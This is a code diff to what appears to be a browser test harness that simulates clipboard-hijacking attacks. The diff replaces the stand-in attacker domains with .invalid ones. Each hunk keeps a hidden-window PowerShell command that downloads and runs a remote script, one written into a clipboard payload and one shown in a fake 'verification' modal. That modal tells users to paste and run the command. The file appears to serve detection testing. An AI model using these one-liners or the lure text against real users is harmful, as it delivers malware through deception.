@@ -38,7 +38,7 @@ function triggerObfuscatedAttack() {
 
 function triggerClipboardItemAttack() {
   // Uses navigator.clipboard.write with ClipboardItem instead of writeText
-  const payload = `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://badsite.com/loader.txt')"`;
+  const payload = `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://badsite.invalid/loader.txt')"`;
   
   console.log("[Test] Attempting ClipboardItem write attack...");
 
@@ -108,7 +108,7 @@ function triggerProactiveModalLure() {
       3. Press Enter to run the PowerShell verification script.
     </div>
     <div style="background:#020617; padding:10px; border-radius:6px; font-family:monospace; font-size:12px; word-break:break-all; margin-bottom:16px; border:1px solid #1e293b; color:#10b981;">
-      powershell.exe -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.com/verify.ps1')
+      powershell.exe -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.invalid/verify.ps1')
     </div>
     <div style="display:flex; justify-content:flex-end; gap:8px;">
       <button id="lure-cancel-btn" style="background:#334155; border:none; padding:8px 16px; border-radius:6px; color:white; cursor:pointer; font-weight:bold;">Cancel</button>
